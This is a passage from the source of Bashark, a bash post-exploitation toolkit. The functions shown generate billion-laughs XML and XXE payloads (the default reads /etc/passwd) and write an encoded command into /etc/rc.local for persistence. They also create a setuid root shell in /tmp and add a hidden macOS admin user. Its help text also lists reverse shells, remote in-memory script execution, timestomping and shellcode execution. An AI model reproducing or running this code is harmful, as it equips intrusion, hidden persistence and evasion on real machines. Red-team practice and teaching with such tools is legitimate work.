  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
 ]>
<lolz>&lol9;</lolz>
EOL
                print_good "Saved payload as ${bold}dos.xml${reset}"
            else
                print_error "No such format"
            fi
        fi
    fi
}

xxe(){
    if [[ "$@" =~ .*-h.* ]]; then
    echo "
        ${underline}USAGE:${reset}       
            xxe [-h] [PAYLOAD]
        ${underline}OPTIONAL POSITIONAL ARGUMENTS:${reset} 
            [PAYLOAD]  Payload to execute inside the entity (default: file:///etc/passwd)
        ${underline}DESCRIPTION:${reset} 
            Generate a XML External Entity Injection file"
    else
        if [ $# -eq 0 ]; then
            payload="file:///etc/passwd"
        else
            payload=$1
        fi
        cat >file.xml <<EOL
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "${payload}" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
EOL
        print_good "Generated ${bold}file.xml${reset} with ${bold}${payload}${reset} payload"
    fi 
}

###Commands that require root
portblock(){
    if [[ "$@" =~ .*-h.* ]]; then 
        echo "
        ${underline}USAGE:${reset}       
            portblock [-h] IFACE PORTS 
        ${underline}POSITIONAL ARGUMENTS:${reset}
            PORTS    Ports to leave opened (divided with ',')
            IFACE    Interface to block ports on 
        ${underline}DESCRIPTION:${reset} 
            Block all ports on localhost except whitelisted in 'PORTS' option"
    else
        if hash iptables 2>/dev/null; then
            if [ "$EUID" -ne 0 ]; then
                print_error "You have to be root"
            else
                if [ $# -eq 0 ]; then
                    print_error "Specify IFACE and PORTS"
                elif [ $# -eq 1 ]; then
                    print_error "Specify PORTS"
                else
                    iface="eth0"
                    sudo iptables -P INPUT DROP
                    IFS=',' read -ra PORTS <<< "$ports"
                    for port in ${PORTS[*]}; do
                        iptables -A INPUT -i $iface -p tcp --dport $port -j ACCEPT #Check this shit
                    done
                    print_good "Blocked all ports except whitelisted"
                fi
            fi
        else
            print_error "Unable to perform port blocking: iptables is not installed"
        fi
    fi
}

persist(){
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            persist [-h] COMMAND
        ${underline}POSITIONAL ARGUMENTS:${reset}
            COMMAND     Command to be launched on every startup  
        ${underline}DESCRIPTION:${reset} 
            Specify command that will be launched on every boot. 
            It will be encoded and written to /etc/rc.local."
    else
        if [ $# -eq 0 ]; then
            print_error "Specify the command"
        else
            if [ "$EUID" -ne 0 ]; then
                print_error "You have to be root"
            else
                command=$1
                encode_cmd="echo -n '$command' | base64"
                encoded=$(eval "$encode_cmd")
                decode_cmd="echo -n '$encoded' | base64 -d"
		decoder="$""(eval ""$decode_cmd)"
                sudo echo $decoder >> /etc/rc.local
                print_good "Appended encoded command to /etc/rc.local"
            fi
        fi
    fi
}

rootshell(){
    if [[ "$@" =~ .*-h.* ]]; then 
        echo "
        ${underline}USAGE:${reset}       
            rootshell [-h] 
        ${underline}DESCRIPTION:${reset} 
            Create a rootshell binary under /tmp directory"
    else
        if [ "$EUID" -ne 0 ]; then
            print_error "You have to be root"
        else
            local shellfile=${1-$SHELL}
            local rootshell=${2-$(mktemp -u)}         
            cp "$shellfile" "$rootshell"
            chmod u+s "$rootshell"
            print_good "Created a rootshell"
            ls -la "$rootshell"
        fi
    fi
}

usradd(){ 
    if [[ "$@" =~ .*-h.* ]]; then
        echo "
        ${underline}USAGE:${reset}       
            useradd [-h] USERNAME
        ${underline}POSITIONAL ARGUMENTS:${reset} 
            USERNAME    Name of the new user
        ${underline}DESCRIPTION:${reset}
            Create a new hidden root user on host (currently OSX only)"
    else
        if [ $# -eq 0 ]; then
            print_error "Specify the username"
        else
            user=$1
            if [ $platform == "osx" ]; then
                dscl . -create /Users/$user PrimaryGroupID 80 || print_good "Created root user"
                sudo dscl . create /Users/$user IsHidden 1 || print_good "Succesfully hid user"
                sudo mv /Users/$user /var/$user || print_good "Moved $user home directory under /var"
                sudo dscl . -create /Users/$user NFSHomeDirectory /var/$user || print_good "Succesfully updated new home directory"
                sudo dscl . -delete "/SharePoints/$user's Public Folder" || print_good "Deleted $user original home directory"
            else
                print_error "Platform is not supported"
            fi    
        fi
    fi
}

##Help command
help(){
        echo "
Bashark ver. 1.0 Commands: 

        (${green}no root required${reset}):
        ${bold}_${reset}${green}            -> ${reset}Go back to previous directory
        ${bold}bruteforce${reset}${green}   -> ${reset}Perform a dictionary attack against a protected file
        ${bold}c${reset}${green}            -> ${reset}Clear screen
        ${bold}cleanup${reset}${green}      -> ${reset}Modify Bashark cleanup routine settings
        ${bold}cve${reset}${green}          -> ${reset}Search for a kernel exploit
        ${bold}esc${reset}${green}          -> ${reset}Escape to a non-restricted shell
        ${bold}fnd${reset}${green}          -> ${reset}Recursively search for string occurrence in current directory
        ${bold}fndre${reset}${green}        -> ${reset}Search for most popular regullar expressions in a file
        ${bold}fileinfo${reset}${green}     -> ${reset}Inspect a file
        ${bold}getapp${reset}${green}       -> ${reset}Enumerate installed applications
        ${bold}getconf${reset}${green}      -> ${reset}Enumerate configuration files
        ${bold}getperm${reset}${green}      -> ${reset}Show files and folders with special permissions
        ${bold}help${reset}${green}         -> ${reset}Show this help message
        ${bold}hosts${reset}${green}        -> ${reset}Enumerate active hosts in background
        ${bold}i${reset}${green}            -> ${reset}Show information about host
        ${bold}isvm${reset}${green}         -> ${reset}Check if OS is running on virtual machine
        ${bold}jshell${reset}${green}       -> ${reset}Establish a reverse Javascript shell
        ${bold}lg${reset}${green}           -> ${reset}Search for regular expression in filenames of current directory
        ${bold}mex${reset}${green}          -> ${reset}Make file executable
        ${bold}memexec${reset}${green}      -> ${reset}Download and execute remote bash script in memory
        ${bold}mkd${reset}${green}          -> ${reset}Create a directory
        ${bold}portscan${reset}${green}     -> ${reset}Perform a portscan
        ${bold}quit${reset}${green}         -> ${reset}Exit Bashark
        ${bold}revshell${reset}${green}     -> ${reset}Spawn a reverse shell
        ${bold}shellcode${reset}${green}    -> ${reset}Execute shellcode in "\x" escaped form
        ${bold}t${reset}${green}            -> ${reset}Create a file
        ${bold}timestomp${reset}${green}    -> ${reset}Change attributes of a file
        ${bold}usrs${reset}${green}         -> ${reset}Show all users on the host
        ${bold}xml_dos${reset}${green}      -> ${reset}Create a XML or YAML DOS file 
        ${bold}xxe${reset}${green}          -> ${reset}Generate a XML External Entity Injection file 

        (${red}root required${reset}):
        ${bold}portblock${reset}${red}    -> ${reset}Block all opened ports except whitelisted
        ${bold}persist${reset}${red}      -> ${reset}Set a command to be executed after every boot
        ${bold}rootshell${reset}${red}    -> ${reset}Create a rootshell
        ${bold}usradd${reset}${red}       -> ${reset}Create a new hidden user (OSX only)

        To show additional information about specific command, type '<command> -h'
        "
}



